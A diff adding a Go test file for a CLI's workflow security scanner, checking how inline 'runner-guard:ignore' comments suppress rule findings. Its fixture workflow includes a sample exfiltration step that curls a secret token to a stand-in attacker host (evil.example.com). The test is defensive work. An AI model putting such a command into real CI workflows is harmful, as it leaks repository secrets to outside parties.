@@ -1,0 +1,80 @@
+//go:build !integration
+
+package cli
+
+import (
+	"testing"
+
+	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
+)
+
+const inlineIgnoreWorkflow = `
+name: Inline Ignore
+on:
+  workflow_dispatch:
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Public index request
+        run: |
+          set -euo pipefail
+          # runner-guard:ignore RGS-012 -- public unauthenticated GET; no secrets are sent.
+          curl -fsS https://models.dev/api.json -o api.json
+      - name: Suspicious request
+        run: |
+          curl -fsS https://evil.example.com/collect -d "secret=$TOKEN"
+`
+
+func TestFilterRunnerGuardIgnoredFindings(t *testing.T) {
+	gitRoot := t.TempDir()
+	writeWorkflow(t, gitRoot, "inline-ignore.lock.yml", inlineIgnoreWorkflow)
+
+	findings := []runnerGuardFinding{
+		{RuleID: "RGS-012", File: "inline-ignore.lock.yml", Line: 9},
+		{RuleID: "RGS-012", File: ".github/workflows/inline-ignore.lock.yml", Line: 16},
+		{RuleID: "RGS-005", File: "inline-ignore.lock.yml", Line: 9},
+	}
+
+	filtered := filterRunnerGuardIgnoredFindings(findings, gitRoot)
+
+	require.Len(t, filtered, 2)
+	assert.Equal(t, 16, filtered[0].Line)
+	assert.Equal(t, "RGS-005", filtered[1].RuleID)
+}
+
+func TestHasRunnerGuardInlineIgnore(t *testing.T) {
+	lines := []string{
+		"      - name: Public index request", // 1
+		"        run: |",                     // 2
+		"          # runner-guard:ignore RGS-012 -- public unauthenticated GET; no secrets sent.", // 3
+		"          curl -fsS https://models.dev/api.json -o api.json",                             // 4
+	}
+
+	assert.True(t, hasRunnerGuardInlineIgnore(lines, 1, "RGS-012"))
+	assert.True(t, hasRunnerGuardInlineIgnore(lines, 4, "RGS-012"))
+	assert.False(t, hasRunnerGuardInlineIgnore(lines, 1, "RGS-005"))
+	assert.False(t, hasRunnerGuardInlineIgnore(lines, 100, "RGS-012"))
+	assert.False(t, hasRunnerGuardInlineIgnore(nil, 1, "RGS-012"))
+}
+
+func TestHasRunnerGuardInlineIgnoreAllowsNearbyGeneratedLineOffsets(t *testing.T) {
+	lines := []string{
+		"      - name: Configure host",         // 1
+		"        run: |",                       // 2
+		"          GH_HOST=github.com",         // 3
+		"      - name: Fetch provider models",  // 4
+		"        run: |",                       // 5
+		"          set -euo pipefail",          // 6
+		"          OUT=/tmp/models",            // 7
+		"          mkdir -p \"$OUT\"",          // 8
+		"          if [ -z \"$TOKEN\" ]; then", // 9
+		"            exit 0",                   // 10
+		"          fi",                         // 11
+		"          # runner-guard:ignore RGS-012 -- official provider endpoint.", // 12
+		"          curl -fsS https://api.example.com/models",                     // 13
+	}
+
+	assert.True(t, hasRunnerGuardInlineIgnore(lines, 3, "RGS-012"))
+}
